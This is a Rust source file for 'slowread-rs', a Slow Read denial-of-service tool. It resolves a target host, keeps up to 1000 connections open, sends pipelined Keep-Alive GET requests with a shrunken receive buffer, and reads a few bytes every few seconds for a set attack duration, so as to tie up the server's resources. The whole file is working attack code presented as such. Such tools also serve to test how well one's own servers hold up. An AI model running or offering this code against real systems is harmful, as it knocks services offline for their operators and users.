extern crate futures;
extern crate http;
#[macro_use]
extern crate structopt;
extern crate native_tls;
extern crate tokio;
extern crate tokio_timer;
extern crate tokio_tls;
extern crate trust_dns_resolver;

use futures::future::{loop_fn, Future, Loop, ok};
use futures::stream::Stream;
use http::Request;
use tokio::spawn;
use std::net::IpAddr;
use std::net::SocketAddr;
use std::sync::{
    atomic::{AtomicUsize, Ordering},
    Arc,
};
use std::time::{Duration, Instant};
use structopt::StructOpt;
use tokio::io;
use tokio::net::TcpStream;
use tokio::timer::{Delay, Deadline, Interval};
use trust_dns_resolver::Resolver;

#[derive(StructOpt, Debug)]
#[structopt(name = "slowread-rs")]
struct Options {
    #[structopt(short = "a", long = "address", parse(from_str = "lookup_ip"))]
    address: SocketAddr,

    #[structopt(short = "f", long = "file", default_value = "/")]
    file: String,

    #[structopt(short = "p", long = "pipeline_factor", default_value = "1")]
    pipeline_factor: usize,

    #[structopt(
        short = "b",
        long = "recv-buffer-size",
        default_value = "2304",
        parse(from_str = "parse_recv_buffer_size")
    )]
    recv_buffer_size: usize,

    /// Bytes to read in a single read 
    #[structopt(short = "r", long = "read-len", default_value = "32")]
    read_len: usize,

    #[structopt(short = "c", long = "connections", default_value = "1000")]
    connections: usize,

    /// Interval between read operations in seconds
    #[structopt(
        short = "w", long = "wait-time", default_value = "5", parse(from_str = "parse_duration")
    )]
    wait_time: Duration,
    
    #[structopt(
        short = "d",
        long = "attack-duration",
        default_value = "300",
        parse(from_str = "parse_duration")
    )]
    attack_duration: Duration,
}

fn parse_duration(src: &str) -> Duration {
    let secs: u64 = src.parse().unwrap();
    Duration::from_secs(secs)
}

fn parse_recv_buffer_size(src: &str) -> usize {
    src.parse::<usize>().unwrap() / 2
}

fn lookup_ip(address: &str) -> SocketAddr {
    let port = if address.starts_with("https://") {
        443
    } else {
        80
    };

    let resolver = Resolver::from_system_conf().unwrap();
    let response = resolver.lookup_ip(address.split("://").last().unwrap());

    if response.is_err() {
        let error = response.unwrap_err();
        panic!(
            "Error resolving address \"{}\". \n{}\nAborting execution...",
            address, error
        );
    }

    let ip_addr_option: Option<IpAddr> = response.unwrap().iter().next();

    if ip_addr_option.is_none() {
        panic!(
            "The address \"{}\" resolved to zero IP addresses. Aborting exeuction...",
            address
        );
    }

    SocketAddr::new(ip_addr_option.unwrap(), port)
}

fn create_url(address: &SocketAddr) -> String {
    let protocol = match address.port() {
        443 => "https://",
        80 => "http://",
        _ => panic!("Unknown port {}.", address.port()),
    };

    protocol.to_owned() + &address.ip().to_string() + ":" + &address.port().to_string()
}

fn main() {
    let options = Options::from_args();

    let url = create_url(&options.address);

    println!("Connecting to \"{}\"", url);

    tokio::run(launch_attacks(url, options));
}

fn launch_attacks(
    url: String,
    options: Options,
    )-> impl Future<Item = (), Error = ()> {

    let open_connections = Arc::new(AtomicUsize::new(0));
    let attack_duration = options.attack_duration;
    let start_time = Instant::now();

    let interval = 
        Interval::new(start_time, Duration::from_secs(1))
        .for_each(move |instant| {
            let connections_left: i32 = options.connections as i32 - open_connections.load(Ordering::SeqCst) as i32;
            for _ in 0..connections_left {
                spawn(launch_attack(
                    &options.address,
                    &url,
                    &options,
                    open_connections.clone(),
                    ));
            }

            print_stats(instant.duration_since(start_time).as_secs(), &open_connections);

            ok(())
        });

    Deadline::new(interval, Instant::now() + attack_duration)
        .map_err(|_| ())
}

fn print_stats(secs_since_start: u64, open_connections: &Arc<AtomicUsize>) {
            println!("Time: {}s\nOpen connections: {}\n\n\n", secs_since_start, open_connections.load(Ordering::SeqCst));
}

fn launch_attack(
    socket_addr: &SocketAddr,
    url: &str,
    options: &Options,
    open_connections: Arc<AtomicUsize>,
) -> impl Future<Item = (), Error = ()> {
    let wait_time = options.wait_time;
    let file = &options.file;
    let read_len = options.read_len;
    let recv_buffer_size = options.recv_buffer_size;
    let pipeline_factor = options.pipeline_factor;

    let request = Request::get(url.to_owned() + file).body(()).unwrap();
    let request = build_http_request(&request).repeat(pipeline_factor);

    TcpStream::connect(&socket_addr)
        .map_err(|_| ())
        .and_then(move |tcp_stream| {
            open_connections.fetch_add(1, Ordering::SeqCst);

            tcp_stream
                .set_recv_buffer_size(recv_buffer_size)
                .unwrap();

            io::write_all(tcp_stream, request)
                .map_err(|_| ())

        }).and_then(move |(tcp_stream, _buf)| {
            let buf: Vec<u8> = Vec::with_capacity(read_len);
            io::read_exact(tcp_stream, buf)
                .map_err(|_| ())

        }).and_then(move |(tcp_stream, _buf)| {
            loop_fn(tcp_stream, move |tcp_stream| {
                let buf: Vec<u8> = Vec::with_capacity(read_len);

                io::read_exact(tcp_stream, buf)
                    .then(move |res| {
                        let (wait_time, value) = match res {
                            Err(_) => (Duration::from_secs(0), ok(Loop::Break(()))),
                            Ok((tcp_stream, _)) => (wait_time, ok(Loop::Continue(tcp_stream)))
                        };

                        Delay::new(Instant::now() + wait_time)
                            .map_err(|_| ())
                            .and_then(|_| value)
                    })
            })
        })
}

fn build_http_request(request: &Request<()>) -> String {
    let mut req_str = String::new();

    req_str.push_str(request.method().as_str());
    req_str.push_str(" ");
    req_str.push_str(request.uri().path_and_query().unwrap().as_str());
    req_str.push_str(" HTTP/1.1\r\n");

    req_str.push_str("Host: ");
    req_str.push_str(request.uri().host().unwrap());
    req_str.push_str("\r\nUser-Agent: rust\r\n");
    req_str.push_str("Accept: */*\r\n");
    req_str.push_str("Connection: Keep-Alive\r\n");

    req_str.push_str("\r\n");

    req_str
}
